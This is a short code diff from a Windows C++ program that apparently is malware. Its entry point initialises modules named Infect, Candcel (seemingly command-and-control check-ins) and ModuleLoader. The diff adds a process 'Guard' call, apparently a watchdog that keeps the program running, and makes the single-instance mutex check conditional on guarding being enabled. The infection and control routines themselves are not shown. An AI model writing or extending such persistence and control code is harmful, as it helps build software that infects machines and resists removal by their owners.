@@ -54,8 +54,9 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	Amendux::Infect::Init();
 	Amendux::Candcel::Init();
 	Amendux::ModuleLoader::Init();
+	Amendux::Process::Guard();
 
-	// Launch the checkin process
+	// Launch the threading processes
 	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
 	Amendux::Process::SpawnGuard();
 
@@ -143,14 +144,17 @@ ATOM MainRegisterClass(HINSTANCE hInstance)
 BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
 	hInst = hInstance; // Store instance handle in our global variable
-	hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, MUTEX);
 
-	if (hMutex) {
-		return false;
+	if (!Amendux::Config::Current()->CanGuardProcess()) {
+		hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, MUTEX);
+
+		if (hMutex) {
+			return false;
+		}
+
+		// Prevent other instances
+		hMutex = CreateMutex(0, 0, MUTEX);
 	}
-
-	// Prevent other instances
-	hMutex = CreateMutex(0, 0, MUTEX);
 
 #if DEBUG
 	// Main window 
